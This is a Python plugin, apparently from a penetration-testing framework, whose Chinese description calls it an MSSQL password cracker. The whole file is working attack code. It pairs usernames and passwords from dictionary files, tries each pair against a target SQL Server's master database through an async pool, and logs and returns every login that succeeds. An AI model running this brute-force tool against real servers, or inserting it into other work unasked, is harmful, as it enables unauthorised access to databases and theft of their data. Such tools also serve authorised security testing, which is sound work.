# -*-* coding:UTF-8
import os
import pymssql


class Plugin(Base):
    __info__ = {
        "author": "doimet",
        "references": ["-"],
        "description": "mssql服务口令破解",
    }

    @cli.options('ip', description="设置输入目标", default='{self.target.value}')
    @cli.options('port', description="设置目标端口", type=int, default=1433)
    @cli.options('method', description="口令爆破模式 1:单点模式 2:交叉模式", type=int, default=2)
    @cli.options('username', description="用户名称或字典文件", default=os.path.join('data', 'mssql_username.dict'))
    @cli.options('password', description="用户密码或字典文件", default=os.path.join('data', 'mssql_password.dict'))
    @cli.options('timeout', description="连接超时时间", type=int, default=3)
    def ip(self, ip, port, method, username, password, timeout) -> dict:
        with self.async_pool() as execute:
            for u, p in self.build_login_dict(
                    method=method,
                    username=username,
                    password=password,
            ):
                execute.submit(self.custom_task, ip, port, u, p, timeout)
            return {'LoginInfo': execute.result()}

    async def custom_task(self, ip, port, username, password, timeout):
        self.log.debug(f'Login => username: {username}, password: {password}')
        conn = pymssql.connect(
            host=ip,
            port=port,
            user=username,
            password=password,
            database="master",
            timeout=timeout,
            charset="utf8"
        )
        conn.close()
        self.log.info(f'Login => username: {username}, password: {password} [success]')
        return {
            'port': port,
            'server': 'mssql',
            'username': username,
            'password': password
        }
